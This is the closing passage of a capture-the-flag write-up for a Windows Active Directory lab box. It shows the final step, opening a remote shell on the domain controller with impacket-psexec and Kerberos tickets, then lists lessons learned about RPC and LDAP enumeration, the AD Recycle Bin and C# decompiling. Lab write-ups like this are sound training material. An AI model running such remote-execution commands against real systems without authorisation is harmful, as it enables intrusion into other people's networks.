    -   {{< figure src="/ox-hugo/2024-10-16-071746_.png" >}}

5.  **I connect using** `impacket-psexec`:
    -   `impacket-psexec casc-dc1.$domain -k`
    -   {{< figure src="/ox-hugo/2024-10-16-071830_.png" >}}


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  I actually had a lot fun using RPC to enumerate, purely as a test, to see how much I could get from the box before I had to switch to other means. It was fun.
2.  It was also nice to have a box where the approach wasn't web based or something in an open share etc, it was fun to use LDAP (which I enjoy) extensively.
3.  I never knew about recovering items from the AD Recycling Bin.
4.  I learned more about C# decompiling etc, however I am going to do more work on this so I have a better understanding. This is one of my weaker points.


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  Oh, one day I couldn't sleep so woke up at 4:30am and wondered why it wouldn't connect for ages until I realized I hadn't updated `/etc/hosts` that was fun.
2.  Again, I spent alot of time on the C# decompiling etc as it's one of my weaker areas.
3.  Oh not realizing the first found password was base64 encoded for a few mins was fun&#x2026;.


## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at proton dot me


